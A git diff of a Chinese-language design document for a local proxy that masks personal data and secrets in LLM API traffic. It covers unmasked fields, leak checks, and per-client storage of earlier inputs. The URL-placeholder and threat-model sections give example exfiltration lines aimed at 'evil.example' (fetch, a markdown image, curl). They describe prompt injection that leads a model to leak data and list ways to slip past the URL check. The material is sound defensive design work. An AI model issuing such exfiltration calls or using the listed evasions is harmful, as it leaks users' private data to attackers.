@@ -189,15 +189,14 @@ flowchart TD
 
 ## 5. 不遮就轉送的欄位
 
-請求中以下鍵的字串值不會被遮（`SKIP_MASK`）：
+請求中以下鍵的字串值不會被遮（`SKIP_MASK`）。值是物件或陣列時照常往下找，所以工具 schema 中名為 `name`、`data`、`url` 的屬性說明照常遮罩。例外：`data` 所在物件的 `type` 是 `text`（Anthropic 純文字文件的 `source`）時照常遮罩；`metadata` 與 `stop` 整個值都不遮（`SKIP_SUBTREE`）。OpenAI 的檔案部分（`file_data`）是 base64 data URL，不解碼也不遮。
 
 | 類型 | 鍵 |
 | --- | --- |
-| 識別碼與列舉 | `model`、`role`、`type`、`id`、`call_id`、`tool_call_id`、`tool_use_id`、`previous_response_id`、`status`、`service_tier`、`reasoning_effort`、`tool_choice`、`stop`、`format`、`cache_control` |
+| 識別碼與列舉 | `model`、`role`、`type`、`id`、`call_id`、`tool_call_id`、`tool_use_id`、`previous_response_id`、`status`、`service_tier`、`reasoning_effort`、`tool_choice`、`format`、`cache_control` |
 | API 精確比對的名稱 | `name`（工具與參與者名稱） |
 | 二進位與檔案 | `data`、`media_type`、`url`、`image_url`、`file_id`、`file_data` |
 | 簽章或加密的模型狀態 | `signature`、`thinking`、`encrypted_content` |
-| 其他 | `metadata` |
 
 回應中 `signature`、`thinking`、`data`、`encrypted_content` 的字串照模型送出的原樣保留（`SKIP_RESTORE`），因為用戶端之後要逐位元組回送。因此 Anthropic 的 thinking 內容會帶著佔位符顯示。
 
@@ -214,12 +213,12 @@ flowchart TD
 | 413 | 請求本文超過 64 MiB。 | 上限 |
 | 404 | POST 到代理不遮罩的路由（例如 `/v1/embeddings`），或 GET、POST 以外的方法。 | 方法與路徑 |
 | 422 | `screen: "refuse"` 且某段文字含控制字元、U+FFFD、孤立 surrogate 或 `⟦`/`⟧`。 | JSON 路徑與字元類別 |
-| 422 | **送出前外洩檢查**：遮罩後請求的任一字串或鍵中，仍找得到某個偵測到的原始值（原樣或 JSON 跳脫形式）。規則值在任何位置都算。名稱模型的值：以空格分詞的文字只算完整單字（`Leeds` 裡的 `Lee` 不算），中日韓文字在任何位置都算；只有一個字的模型值不檢查。 | 最多 5 個欄位路徑 |
-| 422 | 帶 `previous_response_id`，但代理沒有它的先前輸入（重啟、被擠出或從未經過代理）。 | 固定訊息 |
+| 422 | **送出前外洩檢查**：遮罩後請求的任一字串或鍵中，仍找得到某個偵測到的原始值（原樣或 JSON 跳脫形式）。規則值在任何位置、不分 ASCII 大小寫都算（`LIN@EXAMPLE.TEST` 算 `lin@example.test`）。名稱模型的值：以空格分詞的文字只算完整單字（`Leeds` 裡的 `Lee` 不算），中日韓文字在任何位置都算；只有一個字的模型值不檢查。 | 最多 5 個欄位路徑 |
+| 422 | 帶 `previous_response_id`，但代理沒有這個用戶端憑證的先前輸入（重啟、被擠出、從未經過代理，或屬於另一個用戶端）。 | 固定訊息 |
 | 422 | 與 `previous_response_id` 先前輸入合併後 `mask` 拋出 `RedactionError`。 | 錯誤代碼 |
 | 502 | 連不上上游。 | 網路錯誤代碼 |
 
-外洩檢查會在以下情況觸發：偵測到的值也出現在不遮的欄位（第 5 節），或該值出現在較長的詞中間而未被遮。只出現在不遮欄位或物件鍵中、別處沒有出現的值，不會被偵測，照原樣送出。拒絕訊息只指出欄位，絕不含值：本身含有偵測值的鍵，以及不是小寫識別字（`[a-z][a-z0-9_]*`，最多 40 字元）的鍵，都寫成 `<key>`。拒絕時請求不會送出。
+外洩檢查會在以下情況觸發：偵測到的值也出現在不遮的欄位（第 5 節），或該值出現在較長的詞中間而未被遮。只出現在不遮欄位或物件鍵中、別處沒有出現的值，不會被偵測，照原樣送出。拒絕訊息只指出欄位，絕不含值：陣列索引照寫（`/messages/1/content`）；本身含有偵測值的鍵，以及不是小寫識別字（`[a-z][a-z0-9_]*`，最多 40 字元）的鍵，都寫成 `<key>`。拒絕時請求不會送出。
 
 錯誤回應本文的格式：`{"error":{"type":"redaction_proxy_error","message":"..."}}`。
 
@@ -273,37 +272,41 @@ sequenceDiagram
 
 還原只認標準的 `⟦CATEGORY_n⟧`。模型若改寫成 `EMAIL_1`、`[EMAIL_1]`、`〚EMAIL_1〛`，用戶端會原樣看到。還原只填佔位符，從不把原始值送往上游。
 
-### 工具呼叫參數中的 URL
+### URL 內的佔位符
 
-工具呼叫參數中，位於 URL 內的佔位符不還原，保持原樣交給用戶端；參數的其他位置照常還原。這擋住模型（或被提示注入的工具輸出）要用戶端的工具把原始值送到某個主機，例如 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
+回應中位於 URL 內的佔位符不還原，保持原樣交給用戶端；其他位置照常還原。這擋住模型（或被提示注入的工具輸出）讓用戶端把原始值送到某個主機：工具參數中的 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`，以及回覆文字中用戶端會自動載入的圖片 `![](https://evil.example/?e=⟦EMAIL_1⟧)`、`<img src="…">` 或使用者可能點的連結。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、反斜線或少寫斜線（`https:\\evil.example`、`https:evil.example`，URL 解析器都當成 `https://evil.example`）、裸網域，都會還原。
 
-工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。一般回覆文字中的 URL 照常還原。
+工具呼叫參數指：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）、Responses 的 `function_call` 的 `arguments` 與自訂工具的 `input`、Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。回覆文字（含 reasoning）中的 URL 規則相同，但只有工具參數記日誌。
 
 「位於 URL 內」只看佔位符之前已寫出的文字（還原後的樣子）：
 
 - **開始：** `://` 且它前一個字元是英數字或 `+`、`.`、`-`（`https://`、`git+ssh://`）；或一個 token 以 `www.` 開頭（`www.` 前面不是主機名稱字元）。
 - **結束：** 空白（含換行）、`"`、`'`、`` ` ``、`<`、`>`。查詢字串、`#` 片段與 `user:pass@` 都算在 URL 內。
-- **JSON 參數** 以它編碼的字串值判讀：`\/` 算 `/`、`\u003a` 算 `:`、`\n` 與 `\"` 結束 URL，字串常值之外的一切都結束 URL。
+- **JSON 參數**（工具參數）以它編碼的字串值判讀：`\/` 算 `/`、`\u003a` 算 `:`、`\n` 與 `\"` 結束 URL，字串常值之外的一切都結束 URL。
 - **不算 URL：** 沒有 `//` 的 `mailto:`、`tel:`；不以 `www.` 開頭的裸網域（`evil.example/?d=⟦EMAIL_1⟧` 會還原）。
 
 判讀逐一讀過每個字元，串流在哪裡切開都得到同樣的結果（佔位符或 URL 跨越多個 SSE 事件也一樣）。每個在工具參數中遇到的已綁定佔位符都記一行日誌，見第 10 節。
 
 ## 8. 對話內編號與 previous_response_id
 
-代理不保存對話狀態：每個請求都從整份請求重新推導編號。這是刻意的取捨：
+代理不保存對話的對照表：每個請求都從整份請求重新推導編號。這是刻意的取捨：
 
 | 做法 | 好處 | 代價 |
 | --- | --- | --- |
 | 每次從完整歷史重新編號（採用） | 不需持久化、重啟不影響、多個用戶端共用代理不互相干擾 | 同一個值在不同對話中可能拿到不同 id；用戶端改寫早期歷史會改變編號 |
 | 在伺服器端保存每段對話的對照表 | 編號跨請求固定 | 需要辨識對話、需要儲存原始值、重啟或多行程時要同步 |
 
-例外是 Responses API 的接續請求：帶 `previous_response_id` 的請求不重送歷史。代理在每個成功的 Responses 回應後，把該請求的**原始**輸入文字存在行程記憶體中、以回應 id 為鍵（先進先出，最多 256 個）。接續請求時，先把存下的先前輸入放在前面一起遮罩，所以編號與先前輪次一致；日誌的遮罩計數只算這次請求新送出的部分。
+例外是 Responses API 的接續請求：帶 `previous_response_id` 的請求不重送歷史。代理在每個成功的 Responses 回應後，把該請求的**原始**輸入文字存在行程記憶體中、以用戶端範圍與回應 id 為鍵（先進先出，最多 256 個）。用戶端範圍是轉送給上游的憑證（`authorization`，否則 `x-api-key`）的 SHA-256 摘要；沒帶自己憑證、由代理補上設定金鑰的用戶端共用一個範圍。接續請求時，先把存下的先前輸入放在前面一起遮罩，所以編號與先前輪次一致；日誌的遮罩計數只算這次請求新送出的部分。
 
 代價：
 
 - 這些原始文字留在代理的記憶體中，直到被擠出。
 - 代理重啟、或接續的 id 已被擠出後，接續請求以 422 拒絕。若照常轉送，這次請求的編號會把上游記得的舊佔位符（例如指向 A 的 `⟦EMAIL_1⟧`）綁到這次的另一個值 B，靜默還原成錯的值。
-- 存下的文字只以回應 id 為鍵，不分用戶端：知道某個回應 id 的本機呼叫者，可以讓那段對話的原始值進入自己請求的對照表。
+- 帶另一個用戶端的回應 id 的請求，代理找不到它的先前輸入，以 422 拒絕；共用同一把憑證的呼叫者則共用範圍。
+
+### 已知原始值
+
+用戶端可能改寫歷史：壓縮成摘要，或丟掉較早的訊息。值若是靠上下文偵測到的（`password: Tr0ub4dor&3x` 的關鍵詞），先前回覆中還原出來的 `Tr0ub4dor&3x` 少了關鍵詞就不再被偵測，會原樣送上游。因此代理把每個請求綁定的原始值與類別，依同一個用戶端範圍存在記憶體中（每個範圍最多 4,096 個值、最多 64 個範圍，都先進先出），之後同一範圍的請求把它們加進同值擴散，與這次偵測到的值一樣遮罩，並受外洩檢查保護。擴散的規則不變：短於 6 個 ASCII 字元的值不擴散，所以 `password: abc12` 的 `abc12` 不受這個保護。這些原始值留在記憶體中直到被擠出或代理重啟，不寫入磁碟。
 
 ## 9. 控制字元篩檢
 
@@ -322,7 +325,7 @@ sequenceDiagram
 POST /v1/chat/completions -> 200 masked 3 (EMAIL 1, TWID 1, PATH 1) restored 3 unknown 0 7ms
 ```
 
-工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）或因位於 URL 內而保留（`kept inside a URL`）、佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時，請求那一行多出 `kept N`。
+工具呼叫參數中的每個已綁定佔位符另記一行：還原（`restored`）或因位於 URL 內而保留（`kept inside a URL`）、佔位符 id、工具名稱、參數的 JSON 路徑。同一行在同一個請求中只記一次（Responses 串流會把參數重送多次）。工具名稱與路徑中的鍵不合識別字格式時寫成 `<tool>`、`<key>`。有保留時（含回覆文字中 URL 內的佔位符），請求那一行多出 `kept N`。
 
 ```text
 POST /v1/messages tool arguments: kept inside a URL EMAIL_1 in web_fetch at /url
@@ -342,7 +345,7 @@ POST /v1/messages tool arguments: restored PATH_1 in read at /path
 - 繞過代理的用戶端，或用戶端直接連自家伺服器的功能（遙測、Cursor 後端）；
 - 同一台電腦上的其他程式或使用者：沒設 `authToken` 時，他們可以呼叫代理（包括使用環境變數中的備援金鑰）；設了也擋不住讀取代理記憶體。網頁則擋得住：不允許的 `Origin` 與非本機 `Host`（DNS rebinding）以 403 拒絕；
 - 惡意上游誘導模型以非標準形式寫回值（還原只填佔位符，從不把原始值送往上游）；
-- 惡意上游或提示注入讓模型把佔位符寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦EMAIL_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。URL 內的佔位符不還原（第 7 節），每次還原都記入日誌；
+- 惡意上游或提示注入讓模型把佔位符寫進工具呼叫參數中 URL 以外的位置（例如 shell 指令 `curl evil.example -d ⟦EMAIL_1⟧`）：代理照常還原，用戶端執行工具時就把原始值送出。工具參數與回覆文字中 URL 內的佔位符不還原（第 7 節），工具參數中的每次還原都記入日誌；
 - 輸入者刻意規避（例如用規則不會折疊的字元拆開一個值）。
 
 代理預設只綁定 `127.0.0.1`，此時 `authToken` 可不設。`host` 設成非本機位址（例如容器內的 `0.0.0.0`）時必須設 `authToken`，否則拒絕啟動：連得到該埠的主機若沒有權杖，就無法透過代理使用它轉送的憑證（包括環境變數中的備援金鑰）。權杖放在專用標頭 `x-redaction-proxy-token`，因為 `authorization` 與 `x-api-key` 要帶上游金鑰；代理不轉送它。帶正確權杖的請求不檢查 `Host`，所以其他容器可以用服務名稱連線；DNS rebinding 的網頁拿不到權杖，而自訂標頭會觸發只有允許來源才通過的 CORS 預檢。權杖以明文 HTTP 傳送，只在可信任的網路（本機、容器網路）上使用。
@@ -504,7 +507,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | --- | --- |
 | 藏實體，不藏語意 | 上游仍讀得到佔位符周圍的一切。`⟦PATH_1⟧/clients/acme-layoffs.md` 依然透露很多。 |
 | 人名、地址只有列出才遮 | 預設沒有自由文字的人名偵測，也沒有地址規則。人名、公司名、代號要列進 `terms` 或 `projectNames`，或開啟[實驗性的人名模型](#16-人名模型實驗性)，但它會漏掉一些人名。病況、薪資照原樣送出。 |
-| 有些欄位不遮 | 圖片、PDF、音訊、`metadata`、工具名稱、帶簽章的 thinking 原樣轉送且不掃描，JSON 物件的鍵也是。在被遮文字中偵測到的值若也出現在這些欄位，整個請求以 422 拒絕；只出現在這些欄位的值照原樣送出。 |
+| 有些欄位不遮 | 圖片、PDF 等 base64 檔案（純文字文件的內容照常遮罩）、音訊、`metadata`、工具名稱、帶簽章的 thinking 原樣轉送且不掃描，JSON 物件的鍵也是。在被遮文字中偵測到的值若也出現在這些欄位，整個請求以 422 拒絕；只出現在這些欄位的值照原樣送出。 |
 | Cursor 不能用 | Cursor 的自訂 base URL 請求是從 Cursor 自己的伺服器發出，連不到你的 `127.0.0.1`；而且 Cursor 後端在任何代理之前就看到未遮罩的提示。 |
 | 有些拆開的寫法抓不到 | 偵測不到：點後加空格的私有 IP（`192. 168. 1. 2`）；被空格或換行拆開的 API 金鑰（高熵規則只抓得到部分片段）；寫成 `name @ domain`（`@` 兩側有空白，`wang.yichun @ example.tw`）或單獨用 ` at `（`wang.yichun at example.tw`）的 email 不遮，因為 shell 提示字元（`root @ web01.example.com`）、帳號標記（`cc @ alice.me`）、英文散文（`socket.io at github.com`）與矩陣程式碼（`a.b @ c.de`）長得一樣；這類 email 只有隱私分類器把關。抓得到：加了空格或連字號的 terms、`＠`、`(at)`、`[at]`、`[dot]`，以及中間有一個分隔符的身分證字號、統編、手機號碼。 |
 | 有些編碼寫法抓不到 | 百分比編碼（percent-encoding）的值（`lin.yating%40example.com`、查詢字串裡的 `%E6%98%9F…`、`%2FUsers%2F…`）會解碼一層後偵測，遮罩範圍是編碼原文，回覆還原時寫回編碼原文。夾雜無效或截斷的位元組（`%FF`、在 `%E6` 處被截斷的 URL）不會讓其餘部分不解碼，解碼後的全形字元與零寬字元也和一般文字一樣折疊，緊接在無效位元組後面的號碼或金鑰（`%E6%2B886…`、`%E609-1234-5678`、`%FFsk-…`）也抓得到。偵測不到：編碼兩次的值（`%2540`）；表單編碼查詢中代表空格的 `+`（`星河+計畫`）；URL 裡經 base64 編碼的值（隱私路由只在工具輸出中解碼 base64）；緊接在無效位元組後面的身分證字號（`%E6A123456789`），因為 Big5 與 Shift-JIS 中緊接在前導位元組後面的字母是該字的一部分（`%A4A` 是「乙」）。同理，尾位元組為 `A` 的 Shift-JIS 字元可能讓 `%83AKIA…` 被遮成形似金鑰的範圍。 |
@@ -512,9 +515,9 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | 只認標準佔位符 | 模型若把 `⟦EMAIL_1⟧` 改寫成 `[EMAIL_1]`，你會原樣看到它。 |
 | 模型品質可能下降 | 需要直接操作被遮值的任務（例如把絕對路徑改成相對路徑）會變差。你會看到佔位符，不是靜默出錯。 |
 | 會改動一些字元 | 預設把控制字元換成可見字元（`␛`），把原文中的 `⟦` `⟧` 換成 `⟪` `⟫`。 |
-| 重啟會忘記接續對話 | Responses API 的 `previous_response_id` 依賴記憶體中最近 256 個回應；重啟或被擠出後，接續請求以 422 拒絕。 |
+| 重啟會忘記接續對話與已知原始值 | Responses API 的 `previous_response_id` 依賴記憶體中最近 256 個回應；重啟或被擠出後，接續請求以 422 拒絕。已知原始值（第 8 節）重啟後也會忘記。 |
 | 本機預設沒有驗證 | 預設只綁定 `127.0.0.1`；沒設 `authToken` 時，你電腦上的任何程式都能使用它。網頁的請求（不允許的 `Origin`、DNS rebinding）以 403 拒絕。 |
-| 工具參數只有 URL 內不還原 | 工具呼叫參數中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）；其他位置照常還原並記入日誌，所以 shell 指令等仍可能把原始值送出。 |
+| 只有 URL 內不還原 | 回應中 URL 內的佔位符保持原樣（合法的 `https://host/⟦PATH_1⟧` 也一樣）；工具參數的其他位置照常還原並記入日誌，所以 shell 指令等仍可能把原始值送出。 |
 | 請求大小 | 本文超過 64 MiB 以 413 拒絕。 |
 | 尚未對真實服務測試 | 測試與示範都用本機假上游，尚未對 OpenAI、Anthropic、DeepSeek 或真實用戶端驗證。驗證工具已備妥（[e2e/real](../e2e/real/README.md)），尚未執行。 |
 
@@ -529,7 +532,7 @@ node scripts/fetch-name-model.mjs ~/models/nym       # 從 Hugging Face 下載�
 | 合成多語提示，保留集第 2 版（盲寫、只跑一次） | 英文 1,527 個值、10 類宏平均完全遮蔽：核心預設 25.9%、代理預設 39.5%、加人名模型 44.8%；Presidio cutoff 0 為 40.4%、cutoff 0.4 為 37.8%。完全沒遮：核心預設 64.0%、代理預設 49.9%、加人名模型 35.6%、Presidio 29.3–35.0%。遮掉的範圍確實是敏感值：規則 94.3–95.8%、加人名模型 94.8%、Presidio 64.9–68.0%。中位數耗時：規則 0.10–0.12 ms、加人名模型 10.8 ms、Presidio 11.2–11.4 ms。全部 7 種語言的宏平均：核心預設 27.3%、代理預設 37.9%、加人名模型 44.4%（Presidio 34.5%、32.8%，只當英文分析，僅供參考）。還原：只用規則時 1,617 筆全部逐位元組還原，開啟人名模型時 1,587 筆（30 筆不一致） | `heldout-v2.jsonl`（SHA-256 `e3d45536…0bb04`）：英、繁中、簡中、日、韓、德、法共 1,617 筆、10,268 個敏感值、2,997 個困難反例，撰寫者沒看過規則與評測程式，約 60% 的值是非標準寫法；凍結後只評分一次，量測的是 commit `01489cd`（`rules-6+intl-2+ext-1`）。標準寫法與非標準寫法（英文、代理預設、完全遮蔽）：email 100%（n=107）／61.5%（n=148）、電話 70.4%／41.1%、身分證號 89.5%／30.4%、卡號 94.7%／0.0%（n=40）、IBAN 100%（n=15）／0.0%（n=46）、金鑰 95.9%／80.7%、主機 100%（n=93）／43.6%；100% 只出現在標準寫法，且樣本小。弱點（英文、代理預設）：非標準的 IBAN、卡號、身分證號大多抓不到，38% 的非標準 email 完全沒遮；路徑 88% 只遮掉一部分；沒有地址規則（0%）；人名要靠人名模型，完全遮蔽 49%（全部語言 52%）；電話完全遮蔽 51%（Presidio 85%），帶分機的 30 個沒有一個被完全遮蔽。量測之後的兩項修正不在這些數字中：`card-strict` 改認重新分組、點分隔、混用空格和 `-`，以及換行斷開的卡號（這次代理預設的英文卡號完全遮蔽 30.5%，低於核心預設的 44.1%）；人名模型的還原錯誤已修正：同一個名字的不同寫法（`Jordan`、`JORDAN`）現在各拿一個代號，2,908 筆合成資料的還原檢查從 754 筆不一致降到 0 筆。完整結果：[bench/results/public-bench-held-out-v2.md](../bench/results/public-bench-held-out-v2.md)。第 1 版（1,518 筆、較舊的 `rules-6+intl-1`、只有標準寫法）留作紀錄：[bench/results/public-bench-held-out.md](../bench/results/public-bench-held-out.md)。 |
 | 合成多語提示，開發集（初步） | 代理預設（`rules-6+intl-2+ext-1`）、9 類宏平均完全遮蔽：英文 88.9%、全部語言 86.1% | 1,200 筆固定種子的提示（英、繁中、簡中、日），由規則作者撰寫、和規則一起調整，所以分數比保留集高得多；只當開發時的檢查：[bench/results/public-bench-dev.md](../bench/results/public-bench-dev.md)。 |
 
-誤遮的代價是模型看到一個不必要的佔位符，回覆時會被換回原值。語料是英文程式碼，中文散文的誤遮率尚未量測。以 `pnpm test`、`pnpm bench` 與 `pnpm run bench:public` 重現；加上 `--heldout <set.jsonl>` 可另外評分凍結的保留集（格式與 MANIFEST 檢查見 `bench/public/heldout.ts`）。
+誤遮的代價是模型看到一個不必要的佔位符，回覆時會被換回原值。語料是英文程式碼，中文散文的誤遮率尚未量測。以 `pnpm test`、`pnpm bench` 與 `pnpm run bench:public` 重現；加上 `--heldout bench/heldout/heldout-v2.jsonl`（或 `heldout-v1.jsonl`）可另外評分凍結的保留集；兩個檔案的 SHA-256 記在同目錄的 `MANIFEST`，載入時檢查（格式見 `bench/public/heldout.ts`）。
 
 ## 19. 常見問題
 
